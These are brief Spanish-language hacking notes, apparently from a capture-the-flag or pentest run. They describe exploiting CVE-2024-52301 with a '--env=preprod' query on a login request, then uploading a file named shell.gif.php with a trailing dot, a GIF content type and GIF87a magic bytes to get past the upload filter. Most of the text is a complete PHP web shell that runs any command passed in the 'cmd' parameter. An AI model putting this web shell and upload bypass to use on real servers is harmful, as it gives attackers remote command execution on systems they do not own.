
- Si ves  Method Not Allowed  y un debug web page
https://github.com/Nyamort/CVE-2024-52301

- En el login con Burpsuite por **POST** y mete creds random

```html
/login?--env=preprod
```

- Luego
shell.gif.php.

Añade el punto del final y la cabecera necesaria

```bash
image/gif
```

```php
GIF87a
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="text" name="cmd" id="cmd" size="80">
<input type="submit" value="Execute">
</form>
<pre>
<?php
if (isset($_GET['cmd'])) {
system($_GET['cmd']);
}
?>
</pre>
</body>
<script>
document.getElementById("cmd").focus();
</script>
</html>
```
